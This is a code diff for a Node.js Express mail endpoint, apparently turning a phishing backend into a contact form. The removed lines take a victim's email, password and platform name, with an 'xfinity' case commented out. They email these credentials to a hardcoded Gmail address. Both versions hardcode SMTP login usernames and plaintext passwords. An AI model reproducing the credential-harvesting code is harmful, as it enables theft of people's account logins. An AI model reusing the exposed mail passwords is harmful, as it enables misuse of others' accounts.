@@ -21,30 +21,27 @@ const users = [
 
 app.post('/api/send', async (req, res) => {
 
-    const { email, password, platform } = req.body;
+    const { name, email, subject, message } = req.body;
 
-    let recipientEmail = 'raheemjoe08@gmail.com';
+    let recipientEmail = 'edidiongbobson@gmail.com';
 
-  // If the platform is 'xfinity', update the recipient email
-  // if (platform == 'xfinity') {
-  //   recipientEmail = 'Mrtombriggs@gmail.com';
-  // }
+  
 
 
  var transport = nodemailer.createTransport({
-      host: 'mail.jumping-rivers.co.uk',
+      host: 'mail.opdrive.com.ng',
       port: 465,
       auth: {
-        user: 'info@jumping-rivers.co.uk',
-        pass: 'Vanilla11**'
+        user: 'hello@opdrive.com.ng',
+        pass: 'BOBson246**'
       }
     });
 
   let mailOptions = {
-    from: 'tinfo@jumping-rivers.co.uk',
+    from: 'hello@opdrive.com.ng',
     to: recipientEmail,
-    subject: platform,
-    text: 'Platform is ' + platform + ' Username/Email is ' + email + ' password is ' + password,
+    subject: 'New Contact Form Submitted',
+    text: 'Name: ' + name + ' , Email: ' + email + ' , Subject: ' + subject + ' , Message : ' + message,
   };
 
 
@@ -57,7 +54,7 @@ app.post('/api/send', async (req, res) => {
 
 
 
-res.status(200).json({ message: 'Working' + password });
+res.status(200).json({ message: 'Working' });
 
 
 
